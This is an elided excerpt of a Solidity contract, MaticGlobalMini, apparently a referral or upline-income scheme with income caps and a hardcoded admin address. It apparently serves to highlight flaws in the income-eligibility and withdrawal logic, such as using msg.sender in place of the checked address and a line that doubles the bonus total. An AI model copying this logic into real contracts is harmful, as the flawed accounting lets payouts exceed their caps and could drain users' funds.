...
contract MaticGlobalMini {
    ...
    uint256[6] public nonWorkingCapping = [7 ether,11 ether,15 ether,16 ether,15 ether,15 ether];
    ...
    constructor() public {
		primaryAdmin = 0xaf46fEb43D530685A6C6f5c47b8F24935aC710d8;
  ...
  function withdrawal() external{
    ...
    if(!_CheckIncomeEligibility(msg.sender,0)) {
        uint256 OverFlowAmount=TotalBonus.sub(_userDetails.grossInvetment.mul(2));
        TotalBonus -= OverFlowAmount;
        CollectableAmount += OverFlowAmount;
    }
    ...
    _userDetails.flashincome =_userDetails.flashincome.add(CollectableAmount);
   ...
   function _CheckIncomeEligibility(address _address,uint256 _amount) public view returns(bool) {
    ...
    if(_userDetails.nonworkingIncomeCapping<(_user.referrerBonus+_user.referrerBonusTaken+_user.singleDownlineBonus+_userUplineIncome(msg.sender))){
        uint256 ExtraPayable=(_user.referrerBonus+_user.referrerBonusTaken+_user.singleDownlineBonus+_userUplineIncome(msg.sender)).sub(_userDetails.nonworkingIncomeCapping);
        if(ExtraPayable<=(_user.singleDownlineBonus+_userUplineIncome(_address)))
        {
           if(ExtraPayable<=_userUplineIncome(_address))
           {
             CollectableAmount=_userUplineIncome(_address).sub(ExtraPayable);
           }
           else{
             CollectableAmount=_userUplineIncome(_address);
           }
        }
        else{
            CollectableAmount=_userUplineIncome(_address);
    ...
    TotalBonus -= CollectableAmount;

    TotalBonus += TotalBonus.add(_amount);

    if(_userDetails.grossInvetment.mul(2)>=TotalBonus)
    {
        return true;
    }
    else{
  ...
  function _usersDownlineIncomeDistribution(address _user, uint256 _Amount) internal {
      ...
      for (uint i = 0; i < maxupline; i++) {
            ...
            if(_CheckIncomeEligibility(uplineparam,payableAmount) && usersDetails[uplineparam].nonworkingIncomeCapping>=(payableAmount+users[_user].referrerBonus+users[_user].referrerBonusTaken+users[_user].singleDownlineBonus+_userUplineIncome(_user))){
                ...
                usersDetails[uplineparam].flashincome = usersDetails[uplineparam].flashincome.add(payableAmount);
            }
